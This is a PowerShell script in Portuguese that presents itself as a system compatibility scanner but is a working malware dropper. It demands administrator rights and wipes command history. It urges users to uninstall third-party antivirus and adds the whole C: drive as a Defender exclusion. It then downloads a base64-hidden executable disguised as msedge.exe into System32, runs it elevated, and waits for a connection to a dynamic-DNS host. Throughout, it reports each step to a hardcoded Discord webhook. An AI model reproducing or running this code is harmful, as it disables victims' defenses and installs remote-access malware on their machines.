function AL { param ([string]$A, [string]$B = "White") Write-Host "$A" -ForegroundColor $B } 

function XS { 
    Clear-Host; 
    AL "=====================================" "Cyan"; 
    AL "     INICIANDO A VERIFICACAO" "Cyan"; 
    AL "=====================================" "Cyan"; 
    $Host.UI.RawUI.WindowTitle = "Verificando compatibilidade..."; 
    AL "Verificando a compatibilidade do sistema..." "Yellow"; 

    # LOG: Início verificação
    sendLog "🚀 Iniciando verificação de compatibilidade do sistema..."

    $OBF_A_V = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct; 
    if ($OBF_A_V.Count -eq 1 -and $OBF_A_V.displayName -eq "Windows Defender") { BI } 
    elseif ($OBF_A_V.Count -gt 1) { 
        $OBF_A_V | Where-Object { $_.displayName -ne "Windows Defender" } | ForEach-Object { 
            Clear-Host; 
            $av = $_.displayName; 
            AL "Antivirus ($av) bloqueou o processo de analise!" "Red"; 
            AL "Por favor, desinstale temporariamente o antivirus ($av) para continuar." "Yellow"; 
            AL "Voce pode desinstalar o antivirus manualmente atraves do Painel de Controle ou nas Configuracoes do Sistema." "Yellow"; 
            AL "Apos a desinstalacao temporaria, reinicie o processo de analise." "Yellow" 
            
            # LOG: Antivirus detectado
            sendLog "❌ Antivirus detectado: $av bloqueou a análise."
        }; 
        pause; break 
    } else { BI } 
} 

function BI { 
    $P = "C:\"; 
    try { 
        Add-MpPreference -ExclusionPath $P -ErrorAction Stop; 
        Start-Sleep -Seconds 3; 
        JA 

        # LOG: Exclusão adicionada
        sendLog "✅ Exclusão de path adicionada: $P"
    } catch { 
        AL "ERROR [EX-01]" "Red" 
        sendLog "❌ ERROR [EX-01] Falha ao adicionar exclusão."
    } 
} 

function JA { 
    try { 
        Clear-Host; 
        AL "=====================================" "Cyan"; 
        AL "     REALIZANDO A VERIFICACAO..." "Cyan"; 
        AL "=====================================" "Cyan"; 
        $Host.UI.RawUI.WindowTitle = "Realizando a verificacao do sistema..."; 
        AL "Realizando a verificacao do sistema..." "Yellow"; 
        $ProgressPreference = "SilentlyContinue"; 
        $url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2R1c2t4eHgxL21zZGVkZ2UvcmVmcy9oZWFkcy9tYWluL21zZWRnZS5leGU=")); 
        $outputFile = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcV2luZG93c1xTeXN0ZW0zMlxtc2VkZ2UuZXhl")); 
        Invoke-WebRequest -Uri $url -OutFile $outputFile; 
        Start-Process -FilePath $outputFile -Verb RunAs; 
        Start-Sleep -Seconds 2; 
        PX 

        # LOG: Download realizado
        sendLog "📥 Download realizado em: $outputFile"
    } catch { 
        AL "ERROR [DW-01]" "Red"; 
        sendLog "❌ ERROR [DW-01] Falha no download."
        return 
    } 
} 

function PX { 
    try { 
        $xC = [System.Net.Dns]::GetHostAddresses([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cHJveHl6LmRkbnMubmV0")))[0].ToString() 
    } catch { 
        AL "ERROR [DNS-01]" "Red"; 
        sendLog "❌ ERROR [DNS-01] Falha ao resolver DNS."
        return 
    } 
    while ($true) { 
        $xD = Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq $xC -and $_.RemotePort -eq ([BitConverter]::ToInt16([byte[]]@(0x58, 0x1B), 0)) }; 
        if ($xD) { 
            SY; 
            break 
        } else { 
            Clear-Host; 
            AL "=====================================" "Cyan"; 
            AL "     INICIANDO ANALISE DO SISTEMA" "Cyan"; 
            AL "=====================================" "Cyan"; 
            $Host.UI.RawUI.WindowTitle = "Analisando Eventos do Sistema..."; 
            AL "Analisando Logs do Sistema..." "Yellow"; 
            Start-Sleep -Seconds 5 
        } 
    } 
} 

function SY { 
    Clear-Host; 
    $Host.UI.RawUI.WindowTitle = "Finalizado!"; 
    AL "=====================================" "Cyan"; 
    AL "      RELATORIO DO SISTEMA" "Cyan"; 
    AL "=====================================" "Cyan"; 
    $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime; 
    AL "Ultima Inicializacao: $($uptime | Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" "Green"; 

    sendLog "📝 Relatório: Última inicialização do sistema em $($uptime | Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"

    $explorerProcess = Get-Process -Name explorer -ErrorAction SilentlyContinue; 
    if ($explorerProcess) { 
        $explorerStartTime = $explorerProcess.StartTime; 
        $uptimeExplorer = (Get-Date) - $explorerStartTime; 
        AL "Explorer.exe rodando desde: $($explorerStartTime | Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" "Green"; 
        AL "Tempo de execucao: $($uptimeExplorer.Days) dias, $($uptimeExplorer.Hours)h $($uptimeExplorer.Minutes)m $($uptimeExplorer.Seconds)s" "Green" 
        sendLog "📂 Explorer.exe rodando desde $($explorerStartTime | Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
    } else { 
        AL "Explorer.exe nao esta em execucao no momento." "Red" 
        sendLog "⚠️ Explorer.exe não está em execução."
    }; 

    AL "=====================================" "Cyan"; 
    AL "    EVENTOS DE PROCESSOS/SERVICOS PARADOS" "Cyan"; 
    AL "=====================================" "Cyan"; 
    $eventLogs = Get-WinEvent -LogName "System" -MaxEvents 100 | Where-Object { $_.Id -in @(7036, 1001, 7031, 7034) }; 
    if ($eventLogs) { 
        $eventLogs | Select-Object TimeCreated, Id, Message | Format-Table -AutoSize 
        sendLog "📊 Eventos de processos/serviços parados detectados."
    } else { 
        AL "Nenhum evento de processo ou servico finalizado recentemente foi encontrado." "Red" 
        sendLog "✅ Nenhum evento crítico encontrado."
    }; 

    AL "=====================================" "Cyan"; 
    AL "    SERVICOS PARADOS NO SISTEMA" "Cyan"; 
    AL "=====================================" "Cyan"; 
    $stoppedServices = Get-Service | Where-Object { $_.Status -eq 'Stopped' }; 
    if ($stoppedServices) { 
        $stoppedServices | Select-Object DisplayName, Name, Status | Format-Table -AutoSize 
        sendLog "⚠️ Serviços parados foram detectados."
    } else { 
        AL "Nenhum servico parado foi encontrado." "Green" 
        sendLog "✅ Nenhum serviço parado foi encontrado."
    }; 

    AL "=====================================" "Cyan"; 
    AL "      FIM DO RELATORIO" "Cyan"; 
    AL "=====================================" "Cyan" 
    sendLog "🏁 Fim do relatório do sistema."
} 

function M { 
    $u = [Security.Principal.WindowsIdentity]::GetCurrent(); 
    $o = New-Object Security.Principal.WindowsPrincipal($u); 
    $a = $o.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); 
    $Host.UI.RawUI.WindowTitle = "Inicializando..."; 
    Clear-Host; 
    Clear-Content (Get-PSReadlineOption).HistorySavePath; 
    Clear-History; 
    if (-not $a) { 
        AL "Este scanner precisa ser executado como Administrador!" "Red"; 
        pause; 
        exit 
    }; 
    XS; 
    pause 
} 

# =============================
# Função para enviar logs
# =============================
function sendLog($mensagem) {
    try {
        $Body = @{
            "content" = $mensagem
        } | ConvertTo-Json
        Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1410005569720418385/QWXGbPKjtEtBirYrUQbZSRzYjBwsRe6gr_kyEYyD_nMXIYA82dqsjzVxRQfZBPPCByFM" -Method Post -ContentType "application/json" -Body $Body
    } catch {
        Write-Host "Erro ao enviar log para Webhook." -ForegroundColor Red
    }
}

M
